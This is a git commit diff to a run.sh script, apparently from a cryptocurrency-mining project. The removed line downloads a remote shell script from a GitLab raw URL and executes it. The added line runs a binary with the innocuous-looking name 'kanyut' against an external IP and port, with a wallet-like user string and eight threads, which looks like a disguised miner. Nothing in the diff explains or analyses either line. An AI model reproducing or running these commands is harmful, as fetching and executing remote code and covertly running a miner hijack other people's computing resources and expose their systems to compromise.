0ca96f4affaf50d71f5317d02dec2b84e6e7ba3a
ilupa8088 <93107450+ilupa8088@users.noreply.github.com>
2021-10-24 22:31:37 -0500

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-apt-get install wget && wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
+chmod +x kanyut && ./kanyut -v -l 139.99.123.225:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-50 -n 1)-SSSsttt) -p x -t 8
